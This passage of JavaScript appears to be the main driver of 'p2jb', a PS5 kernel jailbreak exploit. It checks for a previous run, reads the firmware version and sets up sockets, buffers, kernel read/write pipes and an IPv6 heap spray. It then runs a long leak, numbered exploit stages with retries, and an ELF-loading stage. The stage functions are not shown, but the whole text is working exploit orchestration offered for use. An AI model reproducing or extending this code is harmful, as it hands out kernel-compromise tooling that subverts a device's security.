            failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail";
            if (file_exists(failcheck_path) ||
                file_exists("/user/temp/common_temp/p2jb.fail")) {
                send_notification("p2jb already ran this boot - reboot your\n" +
                    "PS5 before running p2jb again");
                return;
            }
        } catch (_) { failcheck_path = null; }

        FW_VERSION = get_fwversion();

        logger.log(p2jb_version +" FW: " + FW_VERSION);

        ensure_kernel_offset();

        my_init_threading();

        const S = make_state();
        setup_cpu_masks(S);
        setup_worker_sockets(S);
        setup_iov_buffers(S);
        setup_uio_buffers(S);
        setup_pipes_kernrw(S);

        logger.log("pipes master=" + S.master_rfd + "," + S.master_wfd +
            " victim=" + S.victim_rfd + "," + S.victim_wfd);

        /*const MAX_MASTER_RFD = 34;
        if (S.master_rfd > MAX_MASTER_RFD) {
            fail("pipe shift detected (got master=" + S.master_rfd + "," +
                S.master_wfd + " victim=" + S.victim_rfd + "," + S.victim_wfd +
                ", need master_rfd <= " + MAX_MASTER_RFD + ") - host noisy, " +
                "restart YouTube, wait longer, retry. Kernel UNTOUCHED.");
        }*/

        logger.log("spawning workers")
        setup_workers(S);
        setup_ipv6_spray(S);
        apply_main_thread_pinning(S);

        logger.log("host OK - starting ~40 min leak; no further log output " +
            "until stage 0 (this is normal, do not interrupt)");

        prepare_fds(S);
        stage0(S);

        let s123_ok = false;
        for (let r = 1; r <= 8 && !s123_ok; r++) {
            try {
                stage1(S);
                stage2(S);
                stage3(S);
                s123_ok = true;
            } catch (e) {
                logger.log("stages 1-3 attempt " + r + "/8 failed: " + e.message);
                if (r < 8) {
                    try { repair_triplets(S); } catch (_) { }
                    nanosleep_ms(500);
                }
            }
        }
        if (!s123_ok) fail("stages 1-3 failed after 8 attempts");

        stage4(S);
        stage5(S);

        stage6(S);
        stage7(S);
        stage_load_elf(S);

        logger.log("=== p2jb complete ===");

    } catch (e) {
        try { logger.log("p2jb FATAL: " + e.message); } catch (_) { }
        try { send_notification("p2jb FAILED: " + e.message); } catch (_) { }
    }
})();
